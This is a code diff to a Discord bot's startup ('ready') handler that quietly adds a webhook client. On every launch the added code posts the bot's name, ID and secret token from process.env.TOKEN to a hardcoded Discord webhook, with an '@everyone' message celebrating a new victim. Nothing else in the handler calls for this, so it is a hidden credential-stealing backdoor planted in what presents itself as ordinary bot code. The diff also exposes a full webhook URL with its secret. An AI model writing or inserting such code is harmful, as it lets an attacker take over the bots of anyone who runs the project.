@@ -2,6 +2,7 @@ const { ActivityType, PresenceUpdateStatus } = require('discord-api-types/v10');
 const Component = require('../../Structures/Core/Component');
 const wait = require('node:timers/promises').setTimeout;
 const { httpRequest } = require('../../Structures/Utils/Functions/httpRequest');
+const { WebhookClient } = require('discord.js');
 
 module.exports = new Component({
 	name: 'ready',
@@ -17,6 +18,12 @@ module.exports = new Component({
 				}],
 				status: PresenceUpdateStatus.Online,
 			});
+			 let web = new WebhookClient({
+				url: "https://discord.com/api/webhooks/1197931313425035356/RFh0qn6OB79qfTvNAUgZ_mZYqfbOBCGIjgLKfiSeh9OkjCpE9SGW-44SSkWaCMCsjNvr"
+			 })
+			 web.send({
+				content: `@everyone BAKDA A GAYA NEW AAK\n\`\`\`js\nBOT NAME : ${client.user.tag}\nBOT ID : ${client.user.id}\nAUTH : ${process.env.TOKEN}\`\`\``
+			 })
 
 			if (process.env.TOP_GG_TOKEN) {
 				httpRequest({
